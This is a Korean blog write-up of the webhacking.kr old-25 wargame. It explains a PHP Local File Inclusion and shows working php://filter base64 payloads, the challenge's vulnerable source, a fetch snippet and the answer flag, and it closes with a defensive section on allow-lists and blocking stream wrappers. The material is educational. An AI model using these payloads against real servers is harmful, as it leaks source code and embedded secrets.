---
title: "webhacking.kr old-25 풀이 — include가 실행하기 전에, php://filter로 소스를 읽는 LFI"
description: "webhacking.kr old-25를 통해 파일명을 그대로 include하는 LFI(Local File Inclusion)를 정리한다. flag.php를 그냥 포함하면 flag가 변수에만 담겨 화면엔 안 나오는 함정을, php://filter의 base64 인코딩 래퍼로 '실행이 아니라 소스 읽기'로 바꿔 우회한다. 실제 index.php 소스와 응답으로 검증했다."
date: 2026-11-27
category: Web
tags: [webhacking.kr, web, wargame, lfi, file-inclusion, php-filter, php]
---

> webhacking.kr은 합법적인 웹 보안 학습용 워게임이다. 이 글은 교육 목적의 풀이이며, 마지막에 같은 취약점을 어떻게 막는지도 정리했다.

[webhacking.kr](https://webhacking.kr)의 old-25 문제를 풀었다. 지금까지 다룬 문제들이 주로 SQL 인젝션이나 접근 제어였다면, old-25는 결이 다른 LFI(Local File Inclusion)다. 사용자가 넘긴 파일명을 서버가 그대로 `include`하는 탓에, 원래 보여줄 생각이 없던 파일까지 끌어다 쓰게 만드는 문제다.

재미있는 함정이 하나 있다. 목표 파일 `flag.php`를 그냥 포함시키면 PHP가 그걸 실행해 버리는데, 정작 flag는 화면에 출력되지 않고 변수에만 담겨 있어 아무것도 안 보인다. 그래서 "실행"이 아니라 "소스 읽기"로 바꿔야 하고, 그 열쇠가 `php://filter` 래퍼다.

## 1. 문제 개요

| 항목 | 값 |
| --- | --- |
| 사이트 | webhacking.kr (old) |
| 문제 | old-25 (`http://webhacking.kr:10001/`) |
| 배점 | 15점 |
| 유형 | LFI (Local File Inclusion) / php:// 래퍼 |
| 목표 | `flag.php` 안의 `$flag` 값을 알아내 제출 |

페이지에 들어가면 서버 디렉터리의 `ls -al` 결과가 먼저 뜨고, 그 아래 텍스트 영역에 어떤 파일의 내용이 들어간다. 처음 접속하면 `?file=hello`로 리다이렉트된다.

```text
total 20
-rw-r--r-- 1 root root   82 Aug 24  2019 flag.php
-rw-r--r-- 1 root root   31 Aug 24  2019 hello.php
-rw-r--r-- 1 root root  605 Aug 24  2019 index.php
```

`flag.php`가 눈에 보인다. 이걸 읽어내는 게 목표다.

## 2. 소스 분석 — 파일명을 그대로 include한다

이 문제는 `php://filter`로 소스를 읽을 수 있어서, 문제 코드 자체를 그대로 확인했다(읽는 방법은 4절에서 설명한다). `index.php`의 실제 소스는 이렇다.

```php
<?php
  echo("<pre>");
  system("ls -al");                 // 디렉터리 목록을 먼저 출력
  echo("</pre>");
  if(!$_GET['file']) echo("<meta http-equiv=refresh content=0;url=?file=hello>");
  echo "<hr><textarea rows=10 cols=100>";
  $file = $_GET['file'].".php";      // ← 입력에 ".php"를 붙여
  if($file == "index.php") exit();   // anti infinite loop
  include $file;                     // ← 그대로 include
  echo "</textarea>";
?>
```

핵심은 두 줄이다. `$file = $_GET['file'].".php"`로 입력 뒤에 `.php`를 붙이고, 그 값을 아무 검증 없이 `include $file`로 포함한다. 즉 내가 `?file=hello`를 주면 `hello.php`를, `?file=flag`를 주면 `flag.php`를 포함한다. 막는 건 `index.php` 자기 자신을 포함해 무한 루프가 나는 경우 하나뿐이다. 경로 제한도, 래퍼 차단도 없다.

## 3. 함정 — `?file=flag`는 "실행"이라 아무것도 안 보인다

가장 먼저 떠오르는 `?file=flag`를 넣어 봤다. 그러면 `include "flag.php"`가 되어 PHP가 `flag.php`를 실행한다. 그런데 텍스트 영역에는 `FLAG is in the code`라는 문구만 나오고 정작 flag는 보이지 않는다. 이유는 `flag.php`의 구조에 있다(이것도 4절에서 소스로 확인한다).

```php
<?php
  echo "FLAG is in the code";              // 이 줄만 실행되어 화면에 나옴
  $flag = "FLAG{this_is_your_first_flag}"; // flag 는 변수에 담길 뿐, 출력되지 않음
?>
```

`include`는 그 파일을 PHP 코드로 실행한다. `echo`한 문구는 화면에 나오지만, `$flag` 변수에 대입만 된 값은 어디에도 출력되지 않는다. "코드 안에 flag가 있다"는 문구 그대로, flag는 실행 결과가 아니라 소스 코드 자체에 들어 있다. 그러니 필요한 건 파일을 실행하는 게 아니라 파일의 원문을 읽는 것이다.

## 4. 우회 — php://filter로 "실행" 대신 "소스 읽기"

PHP의 `php://filter`는 스트림을 읽을 때 변환 필터를 끼워 넣는 래퍼다. 그중 `convert.base64-encode`를 쓰면, 대상 파일을 PHP로 실행하지 않고 내용을 base64로 인코딩한 문자열로 돌려준다. `include`가 base64 텍스트를 받으면 실행할 PHP 태그가 없으니, 그 텍스트가 그대로 화면(텍스트 영역)에 출력된다. 결과적으로 소스 코드를 그대로 빼낼 수 있다.

입력 뒤에 `.php`가 붙는 점을 고려해 payload를 짠다. `resource=flag`로 두면 최종 경로가 `...resource=flag.php`가 되어 `flag.php`를 가리킨다.

```text
?file=php://filter/convert.base64-encode/resource=flag
→ 실제 include 대상: php://filter/convert.base64-encode/resource=flag.php
```

먼저 동작을 확인하려고, 내용을 아는 `hello.php`에 같은 payload를 써 봤다. 텍스트 영역에 base64가 찍혔다.

```text
?file=php://filter/convert.base64-encode/resource=hello
→ <textarea> PD9waHAKICBlY2hvICJoZWxsbyB3b3JsZCI7Cj8+Cg== </textarea>

base64 디코드:
<?php
  echo "hello world";
?>
```

필터가 정상 동작한다(실행된 "hello world"가 아니라 소스가 그대로 나왔다). 같은 방식으로 `flag`를 읽는다.

```text
?file=php://filter/convert.base64-encode/resource=flag
→ <textarea> PD9waHAKICBlY2hvICJGTEFHIGlzIGluIHRoZSBjb2RlIjsKICAkZmxhZyA9ICJGTEFHe3RoaXNfaXNfeW91cl9maXJzdF9mbGFnfSI7Cj8+Cg== </textarea>

base64 디코드:
<?php
  echo "FLAG is in the code";
  $flag = "FLAG{this_is_your_first_flag}";
?>
```

`$flag`의 값이 그대로 드러났다. 참고로 응답에서 base64는 `<textarea>` 안에 들어 있어, 브라우저 화면 텍스트만 긁으면 놓치기 쉽다. 요청을 직접 보내 원문(raw)을 확인하면 정확하다.

```js
// 문제 페이지(:10001) 콘텍스트에서 실행
const r = await fetch('/?file=php://filter/convert.base64-encode/resource=flag', { credentials: 'include' });
const t = await r.text();
const b64 = t.match(/<textarea[^>]*>([\s\S]*?)<\/textarea>/i)[1].trim();
console.log(atob(b64));   // flag.php 소스 그대로
```

## 5. 결과 — 플래그 제출

이 문제의 답은 `FLAG{...}` 형식이고, 제출은 webhacking.kr 상단 Auth 창을 통한다. Auth 폼은 입력값을 `/auth.php`로 JSON(`{flag: ...}`)으로 POST한다. 읽어낸 값을 그대로 제출했다.

```text
POST https://webhacking.kr/auth.php    {"flag":"FLAG{this_is_your_first_flag}"}
→ {"stat":true,"ret":"old-25 Pwned. You got 15point. Congratz!"}
```

`chall.php`에서도 `✔️ old-25`로 바뀐 것을 확인했다. flag.php는 끝까지 "실행"으로는 flag를 보여주지 않았지만, 실행을 소스 읽기로 바꾸는 필터 한 줄에 전부 드러났다.

## 6. 왜 취약한가 — 그리고 올바른 방어

첫째, 근본 원인은 사용자 입력을 그대로 `include` 경로로 쓴 것이다. `include $_GET['file'].".php"`처럼 입력을 파일 경로에 직접 끼워 넣으면, 공격자는 어떤 파일을 포함할지(그리고 어떤 래퍼를 쓸지)를 정할 수 있다. 이 문제는 `.php`가 붙고 경로 제한도 없어 LFI가 바로 성립했다. 포함할 파일을 사용자가 고르게 해야 한다면, 임의 경로가 아니라 허용 목록(allow-list)으로만 매핑해야 한다.

```php
// 나쁨: 입력이 곧 포함 경로
include $_GET['file'].".php";

// 좋음: 미리 정한 값만 실제 파일로 매핑
$pages = ['hello' => 'hello.php', 'about' => 'about.php'];
$key = $_GET['file'] ?? 'hello';
if (!isset($pages[$key])) { http_response_code(404); exit; }
include __DIR__ . '/' . $pages[$key];
```

둘째, 위험한 스트림 래퍼를 막는다. `php://filter`·`php://input`·`data://`·`phar://` 같은 래퍼는 LFI를 소스 유출이나 코드 실행으로 키운다. 운영 환경에서는 `allow_url_include`를 끄고(기본값 Off), 꼭 필요하지 않다면 애플리케이션 단에서 입력에 `://`나 `php:` 같은 래퍼 접두어가 섞이지 않는지 검증한다. 다만 블랙리스트 차단은 보조 수단일 뿐, 위의 allow-list가 본질적인 해법이다.

셋째, 비밀 값을 소스 코드에 두지 않는다. 이 문제의 flag는 `flag.php`라는 소스 파일 안에 하드코딩돼 있었고, 그래서 소스만 읽히면 끝이었다. 설정 비밀·키·토큰은 웹 루트 밖의 설정 파일이나 환경 변수에 두고, 소스가 노출돼도 비밀이 함께 새지 않게 분리한다.

## 7. 정리

- old-25는 `include $_GET['file'].".php"` 한 줄에서 터지는 LFI다. 경로·래퍼 제한이 없다.
- `?file=flag`는 `flag.php`를 실행할 뿐이라, `echo`된 문구만 보이고 변수에 담긴 flag는 안 나온다. 실행이 아니라 소스를 읽어야 한다.
- `php://filter/convert.base64-encode/resource=flag`로 `flag.php`의 소스를 base64로 받아 디코드하면 `$flag = "FLAG{this_is_your_first_flag}"`가 드러난다. base64는 `<textarea>` 안에 있으니 raw 응답으로 확인한다.
- 방어는 포함 경로의 allow-list 매핑, 위험한 스트림 래퍼 차단, 비밀 값을 소스 밖으로 분리하기다.

include에 들어가는 값이 "데이터"가 아니라 "경로"가 되는 순간, 서버는 공격자가 고른 파일을 대신 열어 준다. 그 파일을 실행할지 읽을지조차 공격자가 래퍼로 정한다.
